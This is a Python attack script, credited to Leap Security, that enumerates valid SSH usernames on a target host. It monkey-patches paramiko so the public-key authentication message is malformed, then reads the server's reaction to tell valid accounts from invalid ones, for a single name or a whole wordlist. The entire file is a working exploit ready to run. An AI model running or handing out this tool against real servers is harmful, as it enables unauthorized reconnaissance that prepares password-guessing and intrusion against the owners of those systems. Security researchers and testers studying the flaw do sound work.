#!/usr/bin/env python3

import argparse
import asyncio
import logging
import paramiko
import socket
import sys

def add_boolean(*args, **kwargs):
    pass

old_service_accept = paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT]

def service_accept(*args, **kwargs):
    paramiko.message.Message.add_boolean = add_boolean
    return old_service_accept(*args, **kwargs)

paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = service_accept

async def check_user(username, target, port, timeout=60):
    sock = socket.socket()
    sock.settimeout(timeout)
    try:
        sock.connect((target, int(port)))
    except Exception as e:
        print(f'[-] Connection error: {e}')
        return
    transport = paramiko.transport.Transport(sock)

    try:
        transport.start_client()
    except paramiko.ssh_exception.SSHException:
        print('[!] Failed to negotiate SSH transport')
        return

    authenticated = False
    try:
        transport.auth_publickey(username, paramiko.RSAKey.generate(2048))
        authenticated = True
    except (paramiko.AuthenticationException, paramiko.ssh_exception.NoValidConnectionsError):
        pass

    transport.close()

    if authenticated:
        print(f'[+] {username} is a valid username')
    else:
        print(f'[-] {username} is an invalid username')

async def check_users_wordlist(wordlist_path, target, port):
    with open(wordlist_path, 'r') as f:
        for line in f:
            username = line.strip()
            await check_user(username, target, port)

async def main(args):
    if args.username:
        await check_user(args.username, args.target, args.port)
    elif args.wordlist:
        await check_users_wordlist(args.wordlist, args.target, args.port)
    else:
        print('Please specify a username with -u or --username, or a wordlist with -w or --wordlist.')
        sys.exit(1)

logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())

parser = argparse.ArgumentParser(description='SSH User Enumeration by Leap Security (@LeapSecurity)')
parser.add_argument('target', help="IP address of the target system")
parser.add_argument('-p', '--port', default=22, help="Set port of SSH service")
parser.add_argument('-u', '--username', help="Username to check for validity.")
parser.add_argument('-w', '--wordlist', help="Path to a file containing a list of usernames, one per line.")

if len(sys.argv) == 1:
    parser.print_help()
    sys.exit(1)

args = parser.parse_args()

asyncio.run(main(args))
